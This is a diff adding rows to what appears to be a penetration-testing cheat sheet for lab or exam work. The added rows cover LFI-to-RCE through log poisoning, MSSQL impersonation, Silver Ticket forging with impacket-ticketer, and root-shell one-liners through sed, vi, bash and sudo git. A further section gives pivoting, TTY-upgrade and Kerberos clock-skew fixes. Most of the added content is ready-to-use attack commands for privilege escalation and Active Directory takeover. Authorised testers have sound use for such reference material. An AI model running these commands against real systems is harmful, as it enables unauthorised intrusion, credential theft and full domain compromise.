@@ -18,6 +18,8 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **FileUpload (Blocked .php)** | Upload `.htaccess` with `AddType` directive | Bypass extension filters |
 | **Writable SMB Share** | Upload `.lnk` file via `ntlm_theft.py` | Force NTLM authentication (Responder) |
 | **Web Service (Anonymous)** | `cadaver http://10.10.10.10` | Check for WebDAV PUT/MOVE permissions |
+| **LFI (No Wrappers)** | Check `/var/log/apache2/access.log` (Poison UA) | LFI-to-RCE via Log Poisoning |
+| **Port 1433 Cracked** | `mssqlclient ...` then check `IMPERSONATE` rights | Escalation within SQL to Admin/System |
 
 ---
 
@@ -36,6 +38,7 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **GenericWrite (on GPO)** | Inject "Immediate Task" via `gpmc.msc` or `SharpGPOAbuse` | Local/Domain Admin via Group Policy |
 | **BloodHound: ESC1** | `certipy req ... -upn administrator` | Full Domain Admin via Certificate |
 | **CA Server (Port 80/443)** | **ESC8**: Relay SMB/RPC to CA Web Enrollment | Computer/User Impersonation |
+| **Service Hash Cracked** | **Silver Ticket**: `impacket-ticketer -spn ...` | Access specific service as ANY user |
 | **DCSync Rights** | `impacket-secretsdump -just-dc [DOMAIN]/[USER]:[PASS]@DC` | Dump ALL Domain Hashes |
 
 ---
@@ -77,6 +80,23 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **capsh** | `capsh --gid=0 --uid=0 --` |
 | **python** | `python -c 'import os; os.setuid(0); os.system("/bin/sh -p")'` |
 | **awk** | `awk 'BEGIN {system("/bin/sh -p")}'` |
+| **sed** | `sed -n '1e exec /bin/sh -p' /etc/hosts` |
+| **nano/vi** | `:py3 import os; os.setuid(0); os.system("/bin/dash")` |
+| **bash** | `bash -p` |
+| **git** | `sudo git help config` -> `!/bin/sh` |
+
+---
+
+## 6. Common Blockers & Operational Fixes
+
+| If This Happens (Problem) | Do This (Fix) | Result |
+| :--- | :--- | :--- |
+| **Clock Skew Error** | `faketime -5m netexec ...` or `ntpdate [DC]` | Fixes Kerberos/AD Auth |
+| **Need Win Binary on Kali** | `x86_64-w64-mingw32-gcc ...` | Compile .c to .exe locally |
+| **Blocked on Internal IP** | `ligolo-ng` (if UDP 11601 works) or `chisel` | Access internal subnets |
+| **No "bash -i" possible** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Stable TTY |
+| **Proxychains fails** | Check `SOCKS5` version in `/etc/proxychains.conf` | Restores pivoting flow |
+| **LAPS Reading Empty** | Ensure you have `GenericRead` or `All` on the target | Get Local Admin Password |
 
 ---
 
